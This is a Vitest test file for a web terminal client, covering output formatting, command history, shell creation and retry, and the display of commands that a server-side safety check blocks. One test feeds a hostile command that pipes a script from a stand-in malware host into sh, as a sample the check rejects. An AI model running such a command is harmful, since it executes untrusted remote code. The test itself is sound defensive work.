// @vitest-environment happy-dom
import { describe, test, expect, vi, beforeEach, afterEach } from "vitest";
import { SseEventType } from "./client";
import { createHistory, formatEvent, initTerminal } from "./terminal";
import type { Transcript } from "./transcript";

const mockFetch = vi.fn();
vi.stubGlobal("fetch", mockFetch);

const STACK = "ap-northeast-1";

beforeEach(() => {
  mockFetch.mockReset();
  document.body.innerHTML = "";
});

describe("formatEvent", () => {
  test("stdout is written as-is", () => {
    expect(formatEvent({ type: SseEventType.STDOUT, data: "hello" })).toBe("hello");
  });

  test("stderr is dimmed", () => {
    expect(formatEvent({ type: SseEventType.STDERR, data: "warn" })).toBe(
      "\x1b[38;5;252mwarn\x1b[0m",
    );
  });

  test("exit code 0 produces no output", () => {
    expect(formatEvent({ type: SseEventType.COMPLETE, exitCode: 0 })).toBeNull();
  });

  test("a non-zero exit code is reported in red", () => {
    expect(formatEvent({ type: SseEventType.COMPLETE, exitCode: 2 })).toBe(
      "\x1b[31mexit code: 2\x1b[0m\n",
    );
  });
});

describe("createHistory", () => {
  test("an empty history yields nothing", () => {
    const history = createHistory();
    expect(history.prev()).toBeNull();
    expect(history.next()).toBeNull();
  });

  test("prev walks backwards from the newest entry", () => {
    const history = createHistory();
    history.push("first");
    history.push("second");
    expect(history.prev()).toBe("second");
    expect(history.prev()).toBe("first");
    expect(history.prev()).toBeNull();
  });

  test("next walks forward and clears the input past the newest entry", () => {
    const history = createHistory();
    history.push("first");
    history.push("second");
    history.prev();
    history.prev();
    expect(history.next()).toBe("second");
    expect(history.next()).toBe("");
    expect(history.next()).toBeNull();
  });

  test("a new entry resets the cursor to the newest", () => {
    const history = createHistory();
    history.push("first");
    history.prev();
    history.push("second");
    expect(history.prev()).toBe("second");
  });
});

type StubCell = { command: string; written: string[]; finished: boolean };

const setup = () => {
  document.body.innerHTML = `
    <form id="input-bar"><input id="command" disabled /><button disabled></button></form>
    <div id="status"></div>
  `;
  const form = document.getElementById("input-bar") as HTMLFormElement;
  const els = {
    form,
    input: document.getElementById("command") as HTMLInputElement,
    button: form.querySelector("button") as HTMLButtonElement,
    status: document.getElementById("status") as HTMLElement,
  };
  const cells: StubCell[] = [];
  const transcript: Transcript = {
    begin(command) {
      const cell: StubCell = { command, written: [], finished: false };
      cells.push(cell);
      return {
        write(data: string): void {
          cell.written.push(data);
        },
        finish(): void {
          cell.finished = true;
        },
      };
    },
  };
  const stacks: string[] = [];
  const onStack = (stackName: string): void => {
    stacks.push(stackName);
  };
  return { els, transcript, cells, stacks, onStack };
};

const okShell = { ok: true, headers: { get: () => STACK } };

const flush = async (): Promise<void> => {
  await vi.advanceTimersByTimeAsync(0);
};

describe("initTerminal", () => {
  // 接続失敗は再試行タイマーを積む。
  // 実タイマーのままだとテストを跨いで発火する
  beforeEach(() => {
    vi.useFakeTimers();
  });

  afterEach(() => {
    vi.clearAllTimers();
    vi.useRealTimers();
  });

  test("a successful shell creation enables the input and reports the stack", async () => {
    const { els, transcript, cells, stacks, onStack } = setup();
    mockFetch.mockResolvedValue(okShell);

    initTerminal(transcript, els, "en", onStack);
    expect(els.status.textContent).toBe("Connecting…");
    await flush();

    expect(els.status.hidden).toBe(true);
    expect(els.input.disabled).toBe(false);
    expect(els.button.disabled).toBe(false);
    expect(stacks).toEqual([STACK]);
    expect(cells).toEqual([]);
  });

  test("a stack name the dialog rejects leaves the shell alone", async () => {
    const { els, transcript } = setup();
    let shellCalls = 0;
    mockFetch.mockImplementation(() => {
      shellCalls += 1;
      return Promise.resolve(okShell);
    });
    const reject = (): never => {
      throw new Error("unknown stack name: ap-northeast-9");
    };

    initTerminal(transcript, els, "en", reject);
    await flush();
    await vi.advanceTimersByTimeAsync(60_000);

    expect(shellCalls).toBe(1);
    expect(els.input.disabled).toBe(false);
    expect(els.status.hidden).toBe(true);
  });

  test("a failed shell creation keeps the status visible with the reason", async () => {
    const { els, transcript, onStack } = setup();
    mockFetch.mockResolvedValue({
      ok: false,
      status: 503,
      headers: { get: () => null },
      clone: () => ({ json: async () => ({ code: "NO_IDLE_RUNNER" }) }),
    });

    initTerminal(transcript, els, "ja", onStack);
    await flush();

    expect(els.status.hidden).toBe(false);
    expect(els.status.textContent).toBe("実行環境に空きがありません 再試行します…");
    expect(els.input.disabled).toBe(true);
  });

  test("a retry that succeeds hides the status and enables the input", async () => {
    const { els, transcript, onStack } = setup();
    mockFetch
      .mockResolvedValueOnce({
        ok: false,
        status: 503,
        headers: { get: () => null },
        clone: () => ({ json: async () => ({ code: "NO_IDLE_RUNNER" }) }),
      })
      .mockResolvedValue(okShell);

    initTerminal(transcript, els, "en", onStack);
    await vi.advanceTimersByTimeAsync(0);
    expect(els.input.disabled).toBe(true);

    await vi.advanceTimersByTimeAsync(1000);

    expect(els.status.hidden).toBe(true);
    expect(els.input.disabled).toBe(false);
  });

  test("a command opens a cell that is closed once the run ends", async () => {
    const { els, transcript, cells, stacks, onStack } = setup();
    mockFetch.mockImplementation((url: string) => {
      if (url === "/api/shell") return Promise.resolve(okShell);
      return Promise.resolve({
        ok: true,
        headers: { get: (name: string) => (name === "X-Stack-Name" ? STACK : null) },
        body: {
          getReader: () => ({
            read: async () => ({ done: true, value: undefined }),
            cancel: vi.fn(),
          }),
        },
      });
    });

    initTerminal(transcript, els, "en", onStack);
    await flush();
    els.input.value = "date";
    els.form.dispatchEvent(new Event("submit"));
    await flush();

    expect(cells).toHaveLength(1);
    expect(cells[0].command).toBe("date");
    expect(cells[0].finished).toBe(true);
    expect(els.input.value).toBe("");
    // 接続時とexecuteの応答でそれぞれ1回ずつ報告される。
    expect(stacks).toEqual([STACK, STACK]);
  });

  const executeFailure = (status: number, body: unknown) => (url: string) => {
    if (url === "/api/shell") return Promise.resolve(okShell);
    return Promise.resolve({
      ok: false,
      status,
      headers: { get: () => null },
      clone: () => ({ json: async () => body }),
    });
  };

  test("a rejected command shows the verdict and leaves the shell usable", async () => {
    const { els, transcript, cells, onStack } = setup();
    mockFetch.mockImplementation(
      executeFailure(403, { error: "safety probability 0.13 (threshold 0.80)" }),
    );

    const terminal = initTerminal(transcript, els, "en", onStack);
    await flush();
    terminal.run("curl -fsSL https://malware.example.com/install.sh | sh");
    await flush();

    expect(cells[0].written).toEqual([
      "\x1b[31mBlocked by the safety check: safety probability 0.13 (threshold 0.80)\x1b[0m\n",
    ]);
    expect(cells[0].finished).toBe(true);
    expect(els.input.disabled).toBe(false);
  });

  test("an unreachable validator is reported apart from a rejection", async () => {
    const { els, transcript, cells, onStack } = setup();
    mockFetch.mockImplementation(
      executeFailure(503, { error: "validation unavailable: context deadline exceeded" }),
    );

    const terminal = initTerminal(transcript, els, "ja", onStack);
    await flush();
    terminal.run("date");
    await flush();

    expect(cells[0].written).toEqual([
      "\x1b[31m安全性チェックを実行できないため、コマンドを実行していません: validation unavailable: context deadline exceeded\x1b[0m\n",
    ]);
    expect(els.input.disabled).toBe(false);
  });

  test("a recreated shell reports the stack the session moved to", async () => {
    const { els, transcript, cells, stacks, onStack } = setup();
    const moved = "ap-northeast-3";
    let shellCalls = 0;
    mockFetch.mockImplementation((url: string) => {
      if (url === "/api/shell") {
        shellCalls += 1;
        if (shellCalls === 1) return Promise.resolve(okShell);
        return Promise.resolve({ ok: true, headers: { get: () => moved } });
      }
      return Promise.resolve({
        ok: false,
        status: 400,
        headers: { get: (name: string) => (name === "X-Session-Reassigned" ? "true" : null) },
      });
    });

    initTerminal(transcript, els, "en", onStack);
    await flush();
    els.input.value = "date";
    els.form.dispatchEvent(new Event("submit"));
    await flush();

    expect(stacks).toEqual([STACK, moved]);
    expect(cells[0].written).toEqual([
      "\x1b[33mSession recreated. Run the command again.\x1b[0m\n",
    ]);
    expect(els.input.disabled).toBe(false);
  });

  test("a failed shell recreation keeps the input disabled and falls back to reconnecting", async () => {
    const { els, transcript, cells, onStack } = setup();
    let shellCalls = 0;
    mockFetch.mockImplementation((url: string) => {
      if (url === "/api/shell") {
        shellCalls += 1;
        if (shellCalls === 1) return Promise.resolve(okShell);
        return Promise.resolve({
          ok: false,
          status: 503,
          headers: { get: () => null },
          clone: () => ({ json: async () => ({ code: "NO_IDLE_RUNNER" }) }),
        });
      }
      return Promise.resolve({
        ok: false,
        status: 400,
        headers: { get: (name: string) => (name === "X-Session-Reassigned" ? "true" : null) },
      });
    });

    initTerminal(transcript, els, "ja", onStack);
    await flush();
    els.input.value = "date";
    els.form.dispatchEvent(new Event("submit"));
    await flush();

    expect(els.input.disabled).toBe(true);
    expect(els.button.disabled).toBe(true);
    expect(els.status.hidden).toBe(false);
    expect(els.status.textContent).toBe("実行環境に空きがありません 再試行します…");
    expect(cells[0].written).toEqual(["\x1b[31m実行環境に空きがありません\x1b[0m\n"]);
    expect(cells[0].finished).toBe(true);
  });

  test("a shell recreation aborted by the unload does not start reconnecting", async () => {
    const { els, transcript, onStack } = setup();
    const created: Array<string | undefined> = [];
    mockFetch.mockImplementation((url: string, init: { method?: string; signal?: AbortSignal }) => {
      if (url !== "/api/shell") {
        return Promise.resolve({
          ok: false,
          status: 400,
          headers: { get: (name: string) => (name === "X-Session-Reassigned" ? "true" : null) },
        });
      }
      created.push(init.method);
      if (created.length === 1) return Promise.resolve(okShell);
      if (init.method === "DELETE") return Promise.resolve({ ok: true });
      return new Promise((_, reject) => {
        init.signal?.addEventListener("abort", () => {
          reject(new DOMException("aborted", "AbortError"));
        });
      });
    });

    initTerminal(transcript, els, "en", onStack);
    await flush();
    els.input.value = "date";
    els.form.dispatchEvent(new Event("submit"));
    await flush();

    window.dispatchEvent(new Event("beforeunload"));
    await flush();

    expect(created.filter((method) => method === "POST")).toHaveLength(2);
  });

  test("the arrow keys replace the input with history entries", async () => {
    const { els, transcript, onStack } = setup();
    mockFetch.mockResolvedValue(okShell);
    initTerminal(transcript, els, "en", onStack);
    await flush();

    els.input.value = "date";
    els.form.dispatchEvent(new Event("submit"));
    await flush();

    els.input.dispatchEvent(new KeyboardEvent("keydown", { key: "ArrowUp" }));
    expect(els.input.value).toBe("date");
    els.input.dispatchEvent(new KeyboardEvent("keydown", { key: "ArrowDown" }));
    expect(els.input.value).toBe("");
  });

  test("an empty command is not submitted", async () => {
    const { els, transcript, onStack } = setup();
    mockFetch.mockResolvedValue(okShell);
    initTerminal(transcript, els, "en", onStack);
    await flush();
    mockFetch.mockReset();

    els.input.value = "   ";
    els.form.dispatchEvent(new Event("submit"));
    await flush();

    expect(mockFetch).not.toHaveBeenCalled();
  });

  test("run executes a command without going through the input", async () => {
    const { els, transcript, cells, onStack } = setup();
    const commands: string[] = [];
    mockFetch.mockImplementation((url: string, init: { body?: string }) => {
      if (url === "/api/shell") return Promise.resolve(okShell);
      commands.push(JSON.parse(init.body ?? "{}").command);
      return Promise.resolve({
        ok: true,
        headers: { get: (name: string) => (name === "X-Stack-Name" ? STACK : null) },
        body: {
          getReader: () => ({
            read: async () => ({ done: true, value: undefined }),
            cancel: vi.fn(),
          }),
        },
      });
    });

    const terminal = initTerminal(transcript, els, "en", onStack);
    await flush();

    terminal.run("cat /etc/os-release");
    await flush();

    expect(commands).toEqual(["cat /etc/os-release"]);
    expect(cells[0].command).toBe("cat /etc/os-release");
  });

  test("the busy listener starts busy and clears once the shell is up", async () => {
    const { els, transcript, onStack } = setup();
    mockFetch.mockResolvedValue(okShell);

    const terminal = initTerminal(transcript, els, "en", onStack);
    const states: boolean[] = [];
    terminal.setBusyListener((busy) => {
      states.push(busy);
    });
    expect(states).toEqual([true]);

    await flush();
    expect(states).toEqual([true, false]);
  });

  test("a command is ignored while another one is running", async () => {
    const { els, transcript, cells, onStack } = setup();
    mockFetch.mockImplementation((url: string) => {
      if (url === "/api/shell") return Promise.resolve(okShell);
      return new Promise(() => {
        // 実行中のまま止めて、2本目が弾かれることを見る
      });
    });

    const terminal = initTerminal(transcript, els, "en", onStack);
    await flush();

    terminal.run("date");
    await flush();
    terminal.run("whoami");
    await flush();

    expect(cells).toHaveLength(1);
  });
});
